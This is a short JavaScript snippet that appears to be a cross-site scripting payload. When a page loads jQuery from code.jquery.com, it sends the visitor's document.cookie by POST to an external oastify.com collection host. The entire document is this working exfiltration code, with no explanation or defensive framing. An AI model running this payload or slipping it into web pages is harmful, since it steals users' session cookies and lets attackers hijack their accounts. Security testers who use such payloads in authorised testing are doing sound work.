var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://8mvcheojaohdf3432jmgzibkgbm1aq.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
